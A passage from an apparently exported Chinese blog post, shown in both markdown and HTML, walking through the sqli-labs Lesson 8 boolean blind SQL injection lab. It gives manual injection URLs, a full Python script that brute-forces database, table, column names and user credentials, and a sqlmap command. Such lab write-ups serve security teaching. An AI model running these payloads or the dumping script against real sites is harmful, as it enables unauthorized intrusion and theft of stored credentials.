#print(i)\n\t            break\n\t    dump_numlist.append(dump_num)\n\tprint('字段数：', dump_numlist)\n\t\n\tprint('开始爆破字段：')\n\tfor i in range(len(dump_numlist)):\n\t    print(column_namelist[i]+\":\")\n\t    #####字段个数####\n\t    for j in range(dump_numlist[i]):\n\t        dump_len = 0\n\t        dump_name = ''\n\t        ### 字段长度 ####\n\t        for k in range(1, 21):\n\t            db_payload = \"' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+\" % (\n\t                column_namelist[i], db_name, table_namelist[-1], j, k)\n\t            r = requests.get(url + db_payload)\n\t            #print(url + db_payload)\n\t            if \"You are in\" not in r.text:\n\t                dump_len = k - 1\n\t                break\n\t        #print(dump_len)\n\t        for l in range(1, dump_len + 1):\n\t            for m in range(32, 127):\n\t                db_payload = \"'and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+\"  % (\n\t                    column_namelist[i], db_name, table_namelist[-1], j, l, m)\n\t                #print(url + db_payload)\n\t                r = requests.get(url + db_payload)\n\t                if \"You are in\" in r.text:\n\t                    dump_name += chr(m)\n\t                    break\n\t        print('[+]', dump_name)\n\n## SQLMAP ##\n\n跟Lesson-1的过程没有什么大的区别。详细过程可以查看如下。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1%}\n\n清除session\n\n--flush-session  --fresh-queries\n\n`sqlmap -u http://10.60.250.151/sqlilabs/Less-8/?id=1 --dbs --technique B --threads 10 --flush-session --fresh-queries\n`\n\n![3](/img/sql/Lesson-8/3.png)\n\n直接上结果了。\n\n![2](/img/sql/Lesson-8/2.png)","source":"_posts/sqli-labs-lession-8-GET单引号布尔型盲注.md","raw":"---\ntitle: sqli-labs-lession 8 GET单引号布尔型盲注\ndate: 2018-09-26 11:17:37\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs-lession 8 GET单引号布尔型盲注 #\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-8/1.png)\n\n\n## 手注 ##\n\n### 注入点 ###\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1'`\n\n![4](/img/sql/Lesson-8/4.png)\n\n没有信息显示,但是页面改变了\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1'%23`\n\n![5](/img/sql/Lesson-8/5.png)\n\n判断为单引号闭合\n\n### 获取字段数 ###\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' order by 3%23`\n\n![6](/img/sql/Lesson-8/6.png)\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' order by 4%23`\n\n![7](/img/sql/Lesson-8/7.png)\n\n`order by 3`出现`You are in`,`order by 4`没有,确认字段数为3。\n\n### 获取数据库 ###\n\n#### 获取数据库名长度 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 8=length(database())%23`\n\n![8](/img/sql/Lesson-8/8.png)\n\n#### 获取数据库名 ####\n\nleft(str,n):截取字段`str`左侧的n个字符。\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 's'=left(database(),1)%23`\n\n返回正确页面,确认第一个字符是`s`\n\n![9](/img/sql/Lesson-8/9.png)\n\n\t中间都是同样的确认过程...\n\n这样手动确认,直到数据库名长度测完(十分费力...),下面是最终结果\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 'security'=left(database(),8)%23`\n\n![10](/img/sql/Lesson-8/10.png)\n\n### 获取表 ###\n\n#### 获取表数 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=(select count(table_name) from information_schema.tables where table_schema='security')%23`\n\n![11](/img/sql/Lesson-8/11.png)\n#### 获取表名 ####\n\n采用二分法。\n\n以下返回`You are in`表示`True`,无返回表示`Flase`\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 95<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n95:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 109<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n109:Flase\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 102<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n102:Flase\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 98<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n98:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 100<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n100:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 101<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n101:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 101=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n![12](/img/sql/Lesson-8/12.png)\n\n确定ascii码值为101,对应的字符为`e`。\n\n接下来用二分法判断第一个表的第二个字符。\n\n最终能测试出存在下面几张表:\n\n* emails\n* referers\n* uagents\n* users\n\n### 获取列 ###\n\n#### 获取列数 ####\n\n对感兴趣的表获取列数,以users为例。\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 3=(select count(column_name) from information_schema.columns where table_name='users')%23`\n\n![13](/img/sql/Lesson-8/13.png)\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=(select count(column_name) from information_schema.columns where table_name='users')%23`\n\n![14](/img/sql/Lesson-8/14.png)\n\n根据上面两张图可以发现`users`的列数有3个。\n\n#### 获取列长度 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 2=length((select column_name from information_schema.columns where table_name=\"users\" limit 0,1))%23`\n\n![15](/img/sql/Lesson-8/15.png)\n\n说明`users`表中第一列长度为2。\n\n可以测试出总共3列长度分别为:2,8,8。\n\n#### 获取列名 ####\n\n采用二分法。\n\n以下返回`You are in`表示`True`,无返回表示`Flase`\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 95<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n95:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 109<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n109:False\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 102<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n102:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 106<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n106:False\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 104<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n104:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 105<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n105:True\n\n确定ascii码值为105,对应的字符为`i`。因为上面查出的列长度为2,再测试第一列的的第二个字符就可以了,还是用二分法查第二个字符。\n\n直接上结果:\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 100=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),2,1))%23`\n\n\n![16](/img/sql/Lesson-8/16.png)\n\nascii码值为100,对应的字符为`d`,第一列为`id`,同理可以获取到其他两列为`username`, `password`。\n\n### 获取字段 ###\n\n获取字段也和上面的大同小异了,直接给结果。\n\n也是获取字段数量->获取字段长度->获取字段名的流程。\n\n#### 获取字段数量 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 13=(select count(username) from security.users)%23`\n\n字段数是13。\n\n![17](/img/sql/Lesson-8/17.png)\n\n#### 获取字段长度 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=length((select username from security.users limit 0,1))%23`\n\n![18](/img/sql/Lesson-8/18.png)\n\n#### 获取字段值 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 68=ascii(substr((select username from security.users limit 0,1),1,1))%23`\n\n![19](/img/sql/Lesson-8/19.png)\n\nascii码值为68,对应的字符为`D`,第一个账户的第一个字母是`D`。\n\n可以发现上述过程很多都是重复的,可以写个脚本运行。\n\n### 脚本 ###\n\n用Python写的一个爆破脚本,没有用二分法,也没封装起来,力度垃圾,凑合着用。\n\n脚本运行结果:\n\n![20](/img/sql/Lesson-8/20.png)\n\n![21](/img/sql/Lesson-8/21.png)\n\n\timport requests\n\tdb_name = ''#''security'#数据库名\n\tdb_len = 0 #当前数据库长度\n\ttable_num = 0#数据库表数目\n\ttable_names = '' #数据表名\n\ttable_lenlist = [] #数据表名长度列表\n\ttable_namelist = [] #数据表名列表\n\tcolumn_numlist = [] #数据表列数\n\tcolumn_lenlist = [] #列名长度列表\n\tcolumn_namelist = [] #列名列表\n\tdump_numlist = []#字段数量列表\n\turl = 'http://10.60.250.151/sqlilabs/Less-8/?id=1'\n\tdb_payload = ''\n\ti = j = k = l = m = 0\n\t\n\tleft = 97\n\tright = 123\n\t\n\t#查询当前数据库长度\n\tprint(\"查询当前数据库长度。。。\")\n\tfor i in range(1, 21):\n\t    db_payload = \"' and %d=(select length(database()))--+\" % i\n\t    r = requests.get(url+db_payload)\n\t    if \"You are in\" in r.text:\n\t        db_len = i\n\t        break\n\tprint(\"当前数据库长度为\", db_len)\n\t\n\t#暴破当前数据库名\n\tprint(\"暴破当前数据库名...\")\n\t#数据库名长度\n\tfor i in range(1, db_len+1):\n\t    #爆破字段区域\n\t    for j in range(left, right):\n\t        db_payload = \"' and (left(database(), %d))='%s'--+\" % (i, db_name+chr(j))\n\t        #print(url+db_payload)\n\t        r = requests.get(url+db_payload)\n\t        if \"You are in\" in r.text:\n\t            db_name += chr(j)\n\t            print('当前数据库名猜解：'+db_name)\n\t            break\n\tprint(\"当前数据库名:\\n[+]\", db_name)\n\t\n\t#数据库中表数目\n\tprint(\"当前数据库表数目....\")\n\tfor i in range(1,100):\n\t    db_payload = \"' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+\" % (i, db_name)\n\t    #print(url+db_payload)\n\t    r = requests.get(url+db_payload)\n\t    if \"You are in\" in r.text:\n\t        table_num = i\n\t        break\n\tprint(\"当前数据库表数目:\", table_num)\n\t\n\t#数据库中表长度\n\tprint(\"当前数据库表名长度....\")\n\tfor i in range(table_num):\n\t    table_len = 0 #表名长度\n\t    #获取数据表长度\n\t    for j in range(1, 21):\n\t        db_payload = \"' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))--+\" % (db_name, i, j)\n\t        #print(url + db_payload)\n\t        r = requests.get(url + db_payload)\n\t        if \"You are in\" not in r.text:\n\t            table_len = j - 1\n\t            table_lenlist.append(table_len)\n\t            break\n\tprint('表名长度：', table_lenlist)\n\t\n\t#数据库表名\n\tfor i in range(table_num):\n\t    # 获取数据表名\n\t    table_names = ''\n\t    for j in range(1, table_lenlist[i]+1):\n\t        for k in range(left, right):\n\t            db_payload = \"' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))=%d--+\" % (db_name, i, j, k)\n\t            #print(url+db_payload)\n\t            r = requests.get(url+db_payload)\n\t            if \"You are in\" in r.text:\n\t                table_names += chr(k)\n\t                print(\"当前表名猜解：\", table_names)\n\t                break\n\t    table_namelist.append(table_names)\n\tprint(\"当前数据表名:\\n[+]\", table_namelist)\n\t\n\t#数据列数\n\tprint(\"各个数据表列数...\")\n\tfor i in range(table_num):\n\t    #print(i)\n\t    column_num = 0\n\t    for j in range(1, 21):\n\t        db_payload = \"' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+\" % (j, table_namelist[i])\n\t        #print(url + db_payload)\n\t        r = requests.get(url+db_payload)\n\t        if \"You are in\" in r.text:\n\t            column_num = j\n\t            #print(\"[+]\"+table_namelist[i]+\"表列数:\"+ str(column_num))\n\t            column_numlist.append(column_num)\n\t            break\n\tprint(\"[+]数据表列数\", column_numlist)\n\t\n\t#猜解列长度\n\tprint(\"猜解列长度....\")\n\tfor i in range(column_numlist[3]):\n\t    column_len = 0 #列名长度\n\t     #获取列长度\n\t    for j in range(1, 21):\n\t        db_payload = \"' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))--+\" % (i, j)\n\t        #print(url + db_payload)\n\t        r = requests.get(url + db_payload)\n\t        if \"You are in\" not in r.text:\n\t            column_len = j - 1\n\t            break\n\t    column_lenlist.append(column_len)\n\tprint('user列名长度：', column_lenlist)\n\t\n\t#猜解列名\n\tprint(\"猜解列名....\")\n\tfor i in range(column_numlist[3]):\n\t    column_names = ''\n\t    for j in range(1,column_lenlist[i]+1):\n\t        for k in range(left, right):\n\t            db_payload = \"' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))=%d--+\" % (\n\t                i, j, k)\n\t            #print(url + db_payload)\n\t            r = requests.get(url + db_payload)\n\t            if \"You are in\" in r.text:\n\t                column_names += chr(k)\n\t                print(\"当前表名猜解：\", column_names)\n\t                break\n\t    column_namelist.append(column_names)\n\tprint(\"users列名:\\n[+]\", column_namelist)\n\t\n\t#爆破字段\n\tprint(\"爆破字段....\")\n\tprint('开始爆破字段数量：')\n\tfor column in column_namelist[0:]:\n\t    #print(column, '：')\n\t    dump_num = 0\n\t    #爆破各个字段数量\n\t    for i in range(30):\n\t        db_payload = \"' and %d=(select count(%s) from %s.%s)--+\" % (i, column, db_name, table_namelist[-1])\n\t        #print(url+db_payload)\n\t        r = requests.get(url+db_payload)\n\t        if \"You are in\" in r.text:\n\t            dump_num = i\n\t            #print(i)\n\t            break\n\t    dump_numlist.append(dump_num)\n\tprint('字段数：', dump_numlist)\n\t\n\tprint('开始爆破字段：')\n\tfor i in range(len(dump_numlist)):\n\t    print(column_namelist[i]+\":\")\n\t    #####字段个数####\n\t    for j in range(dump_numlist[i]):\n\t        dump_len = 0\n\t        dump_name = ''\n\t        ### 字段长度 ####\n\t        for k in range(1, 21):\n\t            db_payload = \"' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+\" % (\n\t                column_namelist[i], db_name, table_namelist[-1], j, k)\n\t            r = requests.get(url + db_payload)\n\t            #print(url + db_payload)\n\t            if \"You are in\" not in r.text:\n\t                dump_len = k - 1\n\t                break\n\t        #print(dump_len)\n\t        for l in range(1, dump_len + 1):\n\t            for m in range(32, 127):\n\t                db_payload = \"'and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+\"  % (\n\t                    column_namelist[i], db_name, table_namelist[-1], j, l, m)\n\t                #print(url + db_payload)\n\t                r = requests.get(url + db_payload)\n\t                if \"You are in\" in r.text:\n\t                    dump_name += chr(m)\n\t                    break\n\t        print('[+]', dump_name)\n\n## SQLMAP ##\n\n跟Lesson-1的过程没有什么大的区别。详细过程可以查看如下。\n\n{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1%}\n\n清除session\n\n--flush-session  --fresh-queries\n\n`sqlmap -u http://10.60.250.151/sqlilabs/Less-8/?id=1 --dbs --technique B --threads 10 --flush-session --fresh-queries\n`\n\n![3](/img/sql/Lesson-8/3.png)\n\n直接上结果了。\n\n![2](/img/sql/Lesson-8/2.png)","slug":"sqli-labs-lession-8-GET单引号布尔型盲注","published":1,"updated":"2019-06-19T17:23:13.400Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istl100a44dsbytgbktbd","content":"<h1 id=\"sqli-labs-lession-8-GET单引号布尔型盲注\"><a href=\"#sqli-labs-lession-8-GET单引号布尔型盲注\" class=\"headerlink\" title=\"sqli-labs-lession 8 GET单引号布尔型盲注\"></a>sqli-labs-lession 8 GET单引号布尔型盲注</h1><h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-8/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"注入点\"><a href=\"#注入点\" class=\"headerlink\" title=\"注入点\"></a>注入点</h3><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39;</code></p>\n<p><img src=\"/img/sql/Lesson-8/4.png\" alt=\"4\"></p>\n<p>没有信息显示,但是页面改变了</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39;%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/5.png\" alt=\"5\"></p>\n<p>判断为单引号闭合</p>\n<h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; order by 3%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/6.png\" alt=\"6\"></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; order by 4%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/7.png\" alt=\"7\"></p>\n<p><code>order by 3</code>出现<code>You are in</code>,<code>order by 4</code>没有,确认字段数为3。</p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><h4 id=\"获取数据库名长度\"><a href=\"#获取数据库名长度\" class=\"headerlink\" title=\"获取数据库名长度\"></a>获取数据库名长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 8=length(database())%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/8.png\" alt=\"8\"></p>\n<h4 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h4><p>left(str,n):截取字段<code>str</code>左侧的n个字符。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and &#39;s&#39;=left(database(),1)%23</code></p>\n<p>返回正确页面,确认第一个字符是<code>s</code></p>\n<p><img src=\"/img/sql/Lesson-8/9.png\" alt=\"9\"></p>\n<pre><code>中间都是同样的确认过程...</code></pre><p>这样手动确认,直到数据库名长度测完(十分费力…),下面是最终结果</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and &#39;security&#39;=left(database(),8)%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/10.png\" alt=\"10\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><h4 id=\"获取表数\"><a href=\"#获取表数\" class=\"headerlink\" title=\"获取表数\"></a>获取表数</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=&#39;security&#39;)%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/11.png\" alt=\"11\"></p>\n<h4 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h4><p>采用二分法。</p>\n<p>以下返回<code>You are in</code>表示<code>True</code>,无返回表示<code>Flase</code></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 95&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>95:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 109&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>109:Flase</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 102&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>102:Flase</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 98&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>98:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 100&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>100:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 101&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p>101:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 101=ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/12.png\" alt=\"12\"></p>\n<p>确定ascii码值为101,对应的字符为<code>e</code>。</p>\n<p>接下来用二分法判断第一个表的第二个字符。</p>\n<p>最终能测试出存在下面几张表:</p>\n<ul>\n<li>emails</li>\n<li>referers</li>\n<li>uagents</li>\n<li>users</li>\n</ul>\n<h3 id=\"获取列\"><a href=\"#获取列\" class=\"headerlink\" title=\"获取列\"></a>获取列</h3><h4 id=\"获取列数\"><a href=\"#获取列数\" class=\"headerlink\" title=\"获取列数\"></a>获取列数</h4><p>对感兴趣的表获取列数,以users为例。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 3=(select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/13.png\" alt=\"13\"></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=(select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/14.png\" alt=\"14\"></p>\n<p>根据上面两张图可以发现<code>users</code>的列数有3个。</p>\n<h4 id=\"获取列长度\"><a href=\"#获取列长度\" class=\"headerlink\" title=\"获取列长度\"></a>获取列长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 2=length((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/15.png\" alt=\"15\"></p>\n<p>说明<code>users</code>表中第一列长度为2。</p>\n<p>可以测试出总共3列长度分别为:2,8,8。</p>\n<h4 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h4><p>采用二分法。</p>\n<p>以下返回<code>You are in</code>表示<code>True</code>,无返回表示<code>Flase</code></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 95&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>95:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 109&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>109:False</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 102&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>102:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 106&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>106:False</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 104&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>104:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 105&lt;=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1))%23</code></p>\n<p>105:True</p>\n<p>确定ascii码值为105,对应的字符为<code>i</code>。因为上面查出的列长度为2,再测试第一列的的第二个字符就可以了,还是用二分法查第二个字符。</p>\n<p>直接上结果:</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 100=ascii(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),2,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/16.png\" alt=\"16\"></p>\n<p>ascii码值为100,对应的字符为<code>d</code>,第一列为<code>id</code>,同理可以获取到其他两列为<code>username</code>, <code>password</code>。</p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p>获取字段也和上面的大同小异了,直接给结果。</p>\n<p>也是获取字段数量-&gt;获取字段长度-&gt;获取字段名的流程。</p>\n<h4 id=\"获取字段数量\"><a href=\"#获取字段数量\" class=\"headerlink\" title=\"获取字段数量\"></a>获取字段数量</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 13=(select count(username) from security.users)%23</code></p>\n<p>字段数是13。</p>\n<p><img src=\"/img/sql/Lesson-8/17.png\" alt=\"17\"></p>\n<h4 id=\"获取字段长度\"><a href=\"#获取字段长度\" class=\"headerlink\" title=\"获取字段长度\"></a>获取字段长度</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 4=length((select username from security.users limit 0,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/18.png\" alt=\"18\"></p>\n<h4 id=\"获取字段值\"><a href=\"#获取字段值\" class=\"headerlink\" title=\"获取字段值\"></a>获取字段值</h4><p><code>http://10.60.250.151/sqlilabs/Less-8/?id=1&#39; and 68=ascii(substr((select username from security.users limit 0,1),1,1))%23</code></p>\n<p><img src=\"/img/sql/Lesson-8/19.png\" alt=\"19\"></p>\n<p>ascii码值为68,对应的字符为<code>D</code>,第一个账户的第一个字母是<code>D</code>。</p>\n<p>可以发现上述过程很多都是重复的,可以写个脚本运行。</p>\n<h3 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h3><p>用Python写的一个爆破脚本,没有用二分法,也没封装起来,力度垃圾,凑合着用。</p>\n<p>脚本运行结果:</p>\n<p><img src=\"/img/sql/Lesson-8/20.png\" alt=\"20\"></p>\n<p><img src=\"/img/sql/Lesson-8/21.png\" alt=\"21\"></p>\n<pre><code>import requests\ndb_name = &apos;&apos;#&apos;&apos;security&apos;#数据库名\ndb_len = 0 #当前数据库长度\ntable_num = 0#数据库表数目\ntable_names = &apos;&apos; #数据表名\ntable_lenlist = [] #数据表名长度列表\ntable_namelist = [] #数据表名列表\ncolumn_numlist = [] #数据表列数\ncolumn_lenlist = [] #列名长度列表\ncolumn_namelist = [] #列名列表\ndump_numlist = []#字段数量列表\nurl = &apos;http://10.60.250.151/sqlilabs/Less-8/?id=1&apos;\ndb_payload = &apos;&apos;\ni = j = k = l = m = 0\n\nleft = 97\nright = 123\n\n#查询当前数据库长度\nprint(&quot;查询当前数据库长度。。。&quot;)\nfor i in range(1, 21):\n    db_payload = &quot;&apos; and %d=(select length(database()))--+&quot; % i\n    r = requests.get(url+db_payload)\n    if &quot;You are in&quot; in r.text:\n        db_len = i\n        break\nprint(&quot;当前数据库长度为&quot;, db_len)\n\n#暴破当前数据库名\nprint(&quot;暴破当前数据库名...&quot;)\n#数据库名长度\nfor i in range(1, db_len+1):\n    #爆破字段区域\n    for j in range(left, right):\n        db_payload = &quot;&apos; and (left(database(), %d))=&apos;%s&apos;--+&quot; % (i, db_name+chr(j))\n        #print(url+db_payload)\n        r = requests.get(url+db_payload)\n        if &quot;You are in&quot; in r.text:\n            db_name += chr(j)\n            print(&apos;当前数据库名猜解：&apos;+db_name)\n            break\nprint(&quot;当前数据库名:\\n[+]&quot;, db_name)\n\n#数据库中表数目\nprint(&quot;当前数据库表数目....&quot;)\nfor i in range(1,100):\n    db_payload = &quot;&apos; and %d=(select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)--+&quot; % (i, db_name)\n    #print(url+db_payload)\n    r = requests.get(url+db_payload)\n    if &quot;You are in&quot; in r.text:\n        table_num = i\n        break\nprint(&quot;当前数据库表数目:&quot;, table_num)\n\n#数据库中表长度\nprint(&quot;当前数据库表名长度....&quot;)\nfor i in range(table_num):\n    table_len = 0 #表名长度\n    #获取数据表长度\n    for j in range(1, 21):\n        db_payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1))--+&quot; % (db_name, i, j)\n        #print(url + db_payload)\n        r = requests.get(url + db_payload)\n        if &quot;You are in&quot; not in r.text:\n            table_len = j - 1\n            table_lenlist.append(table_len)\n            break\nprint(&apos;表名长度：&apos;, table_lenlist)\n\n#数据库表名\nfor i in range(table_num):\n    # 获取数据表名\n    table_names = &apos;&apos;\n    for j in range(1, table_lenlist[i]+1):\n        for k in range(left, right):\n            db_payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1))=%d--+&quot; % (db_name, i, j, k)\n            #print(url+db_payload)\n            r = requests.get(url+db_payload)\n            if &quot;You are in&quot; in r.text:\n                table_names += chr(k)\n                print(&quot;当前表名猜解：&quot;, table_names)\n                break\n    table_namelist.append(table_names)\nprint(&quot;当前数据表名:\\n[+]&quot;, table_namelist)\n\n#数据列数\nprint(&quot;各个数据表列数...&quot;)\nfor i in range(table_num):\n    #print(i)\n    column_num = 0\n    for j in range(1, 21):\n        db_payload = &quot;&apos; and %d=(select count(column_name) from information_schema.columns where table_name=&apos;%s&apos;)--+&quot; % (j, table_namelist[i])\n        #print(url + db_payload)\n        r = requests.get(url+db_payload)\n        if &quot;You are in&quot; in r.text:\n            column_num = j\n            #print(&quot;[+]&quot;+table_namelist[i]+&quot;表列数:&quot;+ str(column_num))\n            column_numlist.append(column_num)\n            break\nprint(&quot;[+]数据表列数&quot;, 